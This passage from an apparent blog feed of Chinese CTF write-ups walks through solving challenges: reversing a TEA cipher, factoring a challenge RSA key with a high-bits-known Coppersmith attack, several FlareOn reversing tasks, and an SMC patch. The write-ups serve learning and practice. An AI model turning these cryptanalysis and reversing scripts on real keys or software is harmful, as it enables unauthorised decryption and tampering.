sub_55A06D2CC408(v7, <span class="number">0</span>);</span><br><span class="line">  sub_55A06D2CC408(v8, <span class="number">0x830A5376</span>);</span><br><span class="line">  sub_55A06D2CC408(v9, <span class="number">0x1D3D2ACF</span>);</span><br><span class="line">  sub_55A06D2CC667(v10, v9, v8);                <span class="comment">// v10=delta=0x9e3779b9</span></span><br><span class="line">  sub_55A06D2CCA13(v11, a2);</span><br><span class="line">  sub_55A06D2CCA13(v12, (a2 + <span class="number">36</span>));</span><br><span class="line">  sub_55A06D2CCA13(v13, (a2 + <span class="number">72</span>));</span><br><span class="line">  sub_55A06D2CCA13(v14, (a2 + <span class="number">108</span>));</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    sub_55A06D2CC2E9(v7, v7, v10);              <span class="comment">// sum+=delta</span></span><br><span class="line">    left_rot(v15, v6, <span class="number">4</span>);</span><br><span class="line">    sub_55A06D2CC2E9(v15, v15, v11);            <span class="comment">// v15+v11</span></span><br><span class="line">    sub_55A06D2CC2E9(v16, v6, v7);              <span class="comment">// sum+plain</span></span><br><span class="line">    right_rot(v17, v6, <span class="number">5</span>);</span><br><span class="line">    sub_55A06D2CC2E9(v17, v17, v12);            <span class="comment">// key+plain</span></span><br><span class="line">    sub_55A06D2CC667(v15, v15, v16);</span><br><span class="line">    sub_55A06D2CC667(v15, v15, v17);</span><br><span class="line">    sub_55A06D2CC2E9(v5, v5, v15);</span><br><span class="line">    left_rot(v18, v5, <span class="number">4</span>);</span><br><span class="line">    sub_55A06D2CC2E9(v18, v18, v13);</span><br><span class="line">    sub_55A06D2CC2E9(v19, v5, v7);</span><br><span class="line">    right_rot(v20, v5, <span class="number">5</span>);</span><br><span class="line">    sub_55A06D2CC2E9(v20, v20, v14);</span><br><span class="line">    sub_55A06D2CC667(v18, v18, v19);</span><br><span class="line">    sub_55A06D2CC667(v18, v18, v20);</span><br><span class="line">    sub_55A06D2CC2E9(v6, v6, v18);</span><br><span class="line">    --v3;</span><br><span class="line">  &#125; <span class="keyword">while</span> ( v3 );</span><br><span class="line">  sub_55A06D2CCA13(a1, v5);</span><br><span class="line">  sub_55A06D2CCA13((a1 + <span class="number">36</span>), v6);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v21;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始看到一大串 <code>sub_</code> 还以为是 AES 之类的（毕竟之前做过一道类似的），然后看了一下重要的参数</p><p>64bit明文，128bit密钥，32轮加密</p><p>看起来很像tea家族的算法，但不是很确定。因为懒得详细看每个函数了，所以动态调试一下，做个黑盒测试</p><p>调试之后发现 <code>0x830A5376</code> 和 <code>0x1D3D2ACF</code> 其实是用来算 <code>delta</code> 的，算出来 <code>v10=0x9e3779b9</code>，这就肯定是tea家族了</p><p>另外，动调的时候发现这里应该都是用的结构体，所以每个小的加法都是单独的函数给出的，但好像用上的只有结构体的前八个字节，后面的字节有什么用还不太清楚</p><p>然后具体往下看，看到循环中的前几个分别是 <code>sum+=delta</code>，<code>v6&lt;&lt;4</code>，<code>(v6&lt;&lt;4)+k0</code>，<code>sum+p0</code>，<code>v6&gt;&gt;5</code>，<code>k1+p0</code>。和网上的三种 TEA 加密比对了一下，发现竟然就是最简单的 TEA 加密，一开始看这么多函数还以为是 XTEA 呢</p><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p>密钥就是主函数中初始化的几个 <code>0x11</code>，密文就是最后用来 <code>cmp</code> 的字符串（找结构体对应的那个字符数组就行），于是找了个脚本，直接解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0xC6EF3720</span>, i;</span><br><span class="line">    <span class="keyword">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0x79AE1A3B</span>, <span class="number">0X596080D3</span>&#125;, k[<span class="number">4</span>] = &#123;<span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>&#125;;</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%X%X&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把所有密文全扔进去算结果，就能拿到 flag 了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一眼看到这个题就感觉能做出来，果然如此</p><p>深刻体会到了动调进行黑盒测试的重要性，可以大幅度加快做题速度，能猜出来就不要花时间看</p><p>其实这题有点可惜，本来能抢到三血的，结果忘了大小写的问题，脚本算出来后本地测试一直是 <code>error</code>，最后还是大佬队友发现的，然后就过了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;和两位学长一起做出来的，总算是能在团队赛中做出来题了，结束了长达一个月的白给生涯，不容易啊&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>hmg2021 RSA Attack writeup</title>
    <link href="https://s0uthwood.github.io/2021/04/13/hmg2021-RSA-Attack-writeup/"/>
    <id>https://s0uthwood.github.io/2021/04/13/hmg2021-RSA-Attack-writeup/</id>
    <published>2021-04-13T13:39:43.000Z</published>
    <updated>2021-05-19T17:42:52.167Z</updated>
    
    <content type="html"><![CDATA[<p>Re全程白给了，最后转战crypto，压哨提交上了</p><a id="more"></a><p>已知一个$1024$ 位的 $p1$，$p2$ 比 $p1$ 稍小，根据代码知道 $p3\equiv p2!\pmod{p1}$</p><p>根据Wilson定理，$n$ 为质数时有 $(n-1)!\equiv -1\pmod{n}$，所以 $p2! \prod\limits_{i=p2+1}^{p1-2}i\equiv 1\pmod{p1}$，所以可以计算出 $p2+1$ 乘到 $p1-1$ 的结果，然后取模拟并调用 <code>sympy</code> 库即可得到 $p3$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod</span><br><span class="line">p1=<span class="number">172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031</span></span><br><span class="line">p2=<span class="number">172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034</span></span><br><span class="line"></span><br><span class="line">res = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p2 + <span class="number">1</span>, p1 - <span class="number">1</span>):</span><br><span class="line">    res = res * i % p1</span><br><span class="line">res = invmod(res, p1)</span><br><span class="line">p3 = sympy.nextprime(res)</span><br><span class="line">p = p3 &gt;&gt; <span class="number">50</span> &lt;&lt; <span class="number">50</span></span><br></pre></td></tr></table></figure><p>得到的 $p$ 是最终 RSA 加密用的 $P$ 的高位，因此可以使用 Factoring with High Bits Known 攻击，用 sage 构造如下攻击脚本（网上找的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">0xe53f2ea1ce33f589db34b4c25cc9ce4b47cf2cad37e8bb39df1bf014b3f9982cb89d845eff02d167a9a5e979a1fa8f53803cca71aee02f65275b75129e589c6150b6105cdcd7452d6852b1337ad25c9487e944d28e1fcdbf3a655ec56ee15769d08de7c7b3b0d9e410b6155081062cbd679290ab22f838f8722c000000000000</span></span><br><span class="line">N = <span class="number">0xe27e847b1cece6ad3d8a35c27022d94cc14016f9550d41b87b85f946edf0a1c01d8c79a663244143550cfce88038bf29d65070d021991455e4570ea57ea1effc1cf380d572473dc6ea0dc150c431761181e66c578eaeebf156c445d3b6141dda961aa467f4d2c811859534027e5b9e67eb4db051c82602208cfe92674013aafa5b437ae404876ececc2f453bb16734adccc5fb87b16e980e52484f6b9f4bdeb99f2e7dc606bb65628e3f62c7df11abd553ffc6b95d3dda592fa81df5e584687864de702d10669e3aac75ad9c6284b98b44140f347307243b2485f59fa5c3f0eaeaf0addade803f2f09cd4c77f27d672756b9cc62a6325247d8608390e761dc91</span></span><br><span class="line">pbits = p.nbits()</span><br><span class="line">kbits = <span class="number">50</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f = x + p</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">print( <span class="string">&quot;x: %s&quot;</span> %<span class="built_in">hex</span>(<span class="built_in">int</span>(x0)))</span><br><span class="line">p = p+x0</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;p: &quot;</span>, <span class="built_in">hex</span>(<span class="built_in">int</span>(p)))</span><br><span class="line"><span class="keyword">assert</span> N % p == <span class="number">0</span></span><br><span class="line">q = N/<span class="built_in">int</span>(p)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;q: &quot;</span>, <span class="built_in">hex</span>(<span class="built_in">int</span>(q)))</span><br></pre></td></tr></table></figure><p>得到 RSA 的 $P$ 和 $Q$，最终构建解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod, n2s</span><br><span class="line">p = <span class="number">0xe53f2ea1ce33f589db34b4c25cc9ce4b47cf2cad37e8bb39df1bf014b3f9982cb89d845eff02d167a9a5e979a1fa8f53803cca71aee02f65275b75129e589c6150b6105cdcd7452d6852b1337ad25c9487e944d28e1fcdbf3a655ec56ee15769d08de7c7b3b0d9e410b6155081062cbd679290ab22f838f8722fbcdcffc1a2ef</span></span><br><span class="line">q = <span class="number">0xfced19c7532be88658aaa5e9566f5274b9aefa4c5d21582a24cc48c70b5e3c05c17eb6f85b4732d57bdc0288d1f548b92f4f13a6f7b07d07a01173cefb06fb8f2e3591e5d518d1584a8e27331a4e769eae98537fe1fb380ee804574d98188a4c327c8a1d180ee44b9148d63a07216b40e711970c9f1ea097bfbecfc3b52e787f</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> (n2s(c, invmod(e, phi_n), N))</span><br></pre></td></tr></table></figure><p>即可得到flag: <code>flag&#123;w0_x1hu1n_y0u_b5st&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Re全程白给了，最后转战crypto，压哨提交上了&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Crypto" scheme="https://s0uthwood.github.io/categories/CTF/Crypto/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Crypto" scheme="https://s0uthwood.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>FlareOn reverse writeups</title>
    <link href="https://s0uthwood.github.io/2021/04/09/FlareOn-reverse-writeups/"/>
    <id>https://s0uthwood.github.io/2021/04/09/FlareOn-reverse-writeups/</id>
    <published>2021-04-08T17:04:16.000Z</published>
    <updated>2021-05-19T17:45:34.779Z</updated>
    
    <content type="html"><![CDATA[<p>题目都是从BUUOJ上找的</p><a id="more"></a><h1 id="Chanllenge1"><a href="#Chanllenge1" class="headerlink" title="Chanllenge1"></a>Chanllenge1</h1><p>一个修改了 table 的 Base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">fake_base = <span class="string">&#x27;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&#x27;</span></span><br><span class="line">true_base = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;+/&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&#x27;</span></span><br><span class="line">good_cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    good_cipher += true_base[fake_base.index(c)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (good_cipher)</span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(good_cipher))</span><br></pre></td></tr></table></figure><h1 id="Bob-Doge"><a href="#Bob-Doge" class="headerlink" title="Bob Doge"></a>Bob Doge</h1><p>先运行测试一下，发现点击 <code>Decode</code> 之后是乱码</p><p>用 <code>dnSpy</code> 打开，找到 <code>Main</code> 函数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Application.EnableVisualStyles();</span><br><span class="line">Application.SetCompatibleTextRenderingDefault(<span class="literal">false</span>);</span><br><span class="line">Application.Run(<span class="keyword">new</span> Form1());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现只新建了一个 <code>Form1</code></p><p>进入 <code>Form1</code>，找到带有 <code>Click</code> 的函数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">btnDecode_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.pbRoge.Image = Resources.bob_roge;</span><br><span class="line"><span class="built_in">byte</span>[] dat_secret = Resources.dat_secret;</span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="built_in">byte</span> b <span class="keyword">in</span> dat_secret)</span><br><span class="line">&#123;</span><br><span class="line">text += (<span class="built_in">char</span>)((b &gt;&gt; <span class="number">4</span> | ((<span class="built_in">int</span>)b &lt;&lt; <span class="number">4</span> &amp; <span class="number">240</span>)) ^ <span class="number">41</span>);</span><br><span class="line">&#125;</span><br><span class="line">text += <span class="string">&quot;\0&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> text2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; text.Length; j += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">text2 += text[j + <span class="number">1</span>];</span><br><span class="line">text2 += text[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> text3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> k = <span class="number">0</span>; k &lt; text2.Length; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">char</span> c = text2[k];</span><br><span class="line">text3 += (<span class="built_in">char</span>)((<span class="built_in">byte</span>)text2[k] ^ <span class="number">102</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.lbl_title.Text = text3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是从一个 <code>Resources</code> 的地方调用来了一个 <code>dat_secret</code>。但找不到这个地方。</p><p>于是考虑进行动态调试。</p><p>打上断点后调试，点击 <code>Decode</code> 按钮，进入如下页面</p><p><img data-src="flag.png" alt="flag"></p><p>一开始以为最后的 <code>text3</code> 是 <code>flag</code>，结果看到 <code>text</code> 变量长得就很好看，符合 FlareOn 的 flag 的特征，于是直接提交试试，发现通过。</p><h1 id="UltimateMinesweeper"><a href="#UltimateMinesweeper" class="headerlink" title="UltimateMinesweeper"></a>UltimateMinesweeper</h1><p>运行软件测试一下，发现是一个 $30\times 30$ 的扫雷，只有三个格子不是雷。</p><p>exeinfo发现是 <code>.NET</code> 文件，因此拖到 <code>dnSpy</code> 中</p><p>由于是面向对象代码，不太好分析，所以进行动态调试，在生成完扫雷界面后停下，查看内存数据，发现在 <code>mineField.MinesPresent</code> 中存有雷的位置。</p><p><img data-src="mineinmemory.png" alt="mineinmemory"></p><p>先尝试直接手动把雷扔到前三个，然后运行试一下，发现：</p><ul><li>二元数组是先竖后横</li><li>最后出现的结果是乱码</li></ul><p>因此简单看一下最后的生成函数</p><p>寻找 <code>SuccessPopup</code> 的调用</p><p>发现 <code>new SuccessPopup(this.GetKey(this.RevealedCells)).ShowDialog();</code></p><p>因此找到这个方法</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">GetKey</span>(<span class="params">List&lt;uint&gt; revealedCells</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">revealedCells.Sort();</span><br><span class="line">Random random = <span class="keyword">new</span> Random(Convert.ToInt32(revealedCells[<span class="number">0</span>] &lt;&lt; <span class="number">20</span> | revealedCells[<span class="number">1</span>] &lt;&lt; <span class="number">10</span> | revealedCells[<span class="number">2</span>]));</span><br><span class="line"><span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">byte</span>[] array2 = <span class="keyword">new</span> <span class="built_in">byte</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">245</span>,</span><br><span class="line"><span class="number">75</span>,</span><br><span class="line"><span class="number">65</span>,</span><br><span class="line"><span class="number">142</span>,</span><br><span class="line"><span class="number">68</span>,</span><br><span class="line"><span class="number">71</span>,</span><br><span class="line"><span class="number">100</span>,</span><br><span class="line"><span class="number">185</span>,</span><br><span class="line"><span class="number">74</span>,</span><br><span class="line"><span class="number">127</span>,</span><br><span class="line"><span class="number">62</span>,</span><br><span class="line"><span class="number">130</span>,</span><br><span class="line"><span class="number">231</span>,</span><br><span class="line"><span class="number">129</span>,</span><br><span class="line"><span class="number">254</span>,</span><br><span class="line"><span class="number">243</span>,</span><br><span class="line"><span class="number">28</span>,</span><br><span class="line"><span class="number">58</span>,</span><br><span class="line"><span class="number">103</span>,</span><br><span class="line"><span class="number">179</span>,</span><br><span class="line"><span class="number">60</span>,</span><br><span class="line"><span class="number">91</span>,</span><br><span class="line"><span class="number">195</span>,</span><br><span class="line"><span class="number">215</span>,</span><br><span class="line"><span class="number">102</span>,</span><br><span class="line"><span class="number">145</span>,</span><br><span class="line"><span class="number">154</span>,</span><br><span class="line"><span class="number">27</span>,</span><br><span class="line"><span class="number">57</span>,</span><br><span class="line"><span class="number">231</span>,</span><br><span class="line"><span class="number">241</span>,</span><br><span class="line"><span class="number">86</span></span><br><span class="line">&#125;;</span><br><span class="line">random.NextBytes(array);</span><br><span class="line">uint num = <span class="number">0U</span>;</span><br><span class="line"><span class="keyword">while</span> ((<span class="built_in">ulong</span>)num &lt; (<span class="built_in">ulong</span>)((<span class="built_in">long</span>)array2.Length))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span>[] array3 = array2;</span><br><span class="line">uint num2 = num;</span><br><span class="line">array3[(<span class="built_in">int</span>)num2] = (array3[(<span class="built_in">int</span>)num2] ^ array[(<span class="built_in">int</span>)num]);</span><br><span class="line">num += <span class="number">1U</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Encoding.ASCII.GetString(array2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>似乎最后的结果和扫雷时点击的位置也有关系，所以不能手动修改雷的位置</p><p>那就找到三个 <code>False</code> 并记录下来即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7 20</span><br><span class="line">28 7</span><br><span class="line">24 28</span><br></pre></td></tr></table></figure><p>运行并点击这三个位置</p><p><img data-src="whereismine.png" alt="whereismine"></p><p>最后弹出 flag</p><p><img data-src="thisisflag.png" alt="thisisflag"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目都是从BUUOJ上找的&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="BUUOJ" scheme="https://s0uthwood.github.io/tags/BUUOJ/"/>
    
  </entry>
  
  <entry>
    <title>GWCTF2019 re3 writeup</title>
    <link href="https://s0uthwood.github.io/2021/04/08/GWCTF2019-re3-writeup/"/>
    <id>https://s0uthwood.github.io/2021/04/08/GWCTF2019-re3-writeup/</id>
    <published>2021-04-08T14:36:12.000Z</published>
    <updated>2021-05-19T17:44:03.351Z</updated>
    
    <content type="html"><![CDATA[<p>前言：</p><p>下午在上课的时候写了个 AES 加密，晚上正好遇到，立马认出来了，于是赶紧把解密部分写完，用自己的代码跑出来了，爽到。</p><a id="more"></a><h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>首先通过关键字符串 <code>Wrong</code> 进入 <code>main</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%39s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(s) != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mprotect(&amp;dword_400000, <span class="number">0xF000</span>uLL, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">223</span>; ++i )</span><br><span class="line">    *((_BYTE *)sub_402219 + i) ^= <span class="number">0x99</span>u;</span><br><span class="line">  sub_40207B((__int64)&amp;unk_603170);</span><br><span class="line">  sub_402219();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读一下代码，发现先是输入一个长度为32的字符串</p><p>随后对一个奇怪的地址执行了一个函数，但这个地址和输入应该没有关系，可以暂时不管</p><p>注意到有个 <code>for</code> 循环对某一个地址的值做了个异或，最后又调用了这个地址，这是简单且经典的 SMC</p><p>用 idapython patch 一下，用运行脚本功能，由于长度较短，直接在ida中手写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x402219</span></span><br><span class="line">end = start + <span class="number">223</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">    patch_byte(i, get_wide_byte(i) ^ <span class="number">0x99</span>)</span><br></pre></td></tr></table></figure><p>运行完后进入这个地址，好像不能在 <code>402219</code> 处新建函数，只能在 <code>40221A</code> 处按 p 键新建函数，F5 查看这个函数</p><figure class="highlight c"><table><tr><td 